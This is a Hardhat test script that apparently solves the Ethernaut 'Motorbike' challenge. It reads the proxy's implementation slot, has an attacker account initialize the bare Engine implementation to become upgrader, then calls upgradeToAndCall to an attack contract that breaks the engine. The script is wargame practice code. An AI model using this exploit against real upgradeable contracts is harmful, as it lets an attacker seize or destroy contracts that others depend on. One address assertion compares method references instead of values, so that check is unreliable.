const { ethers, deployments, getNamedAccounts, waffle } = require("hardhat")
const { deploy } = deployments
const { assert, expect } = require("chai")

function ethereumFunctionSelector(functionSignature){
    const functionSignatureAsUtf8Bytes = ethers.utils.toUtf8Bytes(functionSignature)
    const signatureCksum = ethers.utils.keccak256(functionSignatureAsUtf8Bytes)
    // end is 10 because we want the first four bytes (8 characters), and
    // signatureCksum starts with 0x (two characters).  arrayify expects
    // what ethers calls a DataHexStringOrArrayish https://docs.ethers.org/v5/api/utils/bytes/
    // which is something like 0xdd365b8b
    const firstFourBytesOfChecksum = signatureCksum.slice(0, 10)
    return firstFourBytesOfChecksum
  }

describe("Motor Bike", () => {
    let engine, Proxy, deployer, attacker, provider,engineBike, attack
    beforeEach(async () => {
        provider = waffle.provider
        const accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]

        engineBike = await deploy("Engine", {
            from:  deployer.address,
            args:[]
        })

        await deploy("Motorbike", {
            from:deployer.address,
            args:[engineBike.address]
        })

        await deploy("attack",{
            from:attacker.address,
            args:[]
        })

        attack = await ethers.getContract("attack")
        Proxy = await ethers.getContract("Motorbike")
        engine = await ethers.getContract("Engine")
    })
    describe("Let's check the initialized the thing", ()=>{
        it("Check the address of the implementation contract and the horse power", async()=>{
            //Checking the storage and variables on engine contract
            const hp = await engine.horsePower()
            assert.equal(hp.toString(),"0")
            //This gives us hint that the values are stored in proxy contract not in out engine contract
            const impAdrress = (await provider.getStorageAt(Proxy.address,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")).toString()
            //Proxy contract will do delegate call to initialize then the variables will be initialized in the Proxy contract(MOtor bike) not in engine
            const impAdrress2 = (await provider.getStorageAt(Proxy.address,0)).toString()
            const adrres = (impAdrress.slice(26,66))
            const address = ("0x").concat(adrres)
            assert.equal((address).toLowerCase,(engine.address).toLowerCase)
            //Let's get the storage slot of engine contract
            const storage0Engine = await provider.getStorageAt(engine.address,0)
            console.log(impAdrress2)
            console.log(`This is engine storage${storage0Engine}`)
            console.log(`$This is implementation address ${impAdrress}`)
            //Means we are ready to call a initialize function in engine contract
            const engineAttack = await engine.connect(attacker)
            await engineAttack.initialize()
            const upgrader = await engine.upgrader()
            assert.equal(upgrader.toString(), attacker.address) // Became the upgrader now we deploy
            //Let's check till the contract is working properly
            const greet = await engine.sayHello()
            console.log(greet.toString())
            const iface = new hre.ethers.utils.Interface(["function initialize()"])
            const init_enc = iface.encodeFunctionData("initialize", [])//In the array we have to pass the arguments that , initialize function takes
            const tx = await engineAttack.upgradeToAndCall(attack.address, init_enc)
            await tx.wait()
            const greet2 = await Proxy.sayHello()
            console.log(greet2.toString())  //Done engine is now not working
        })
    })
})
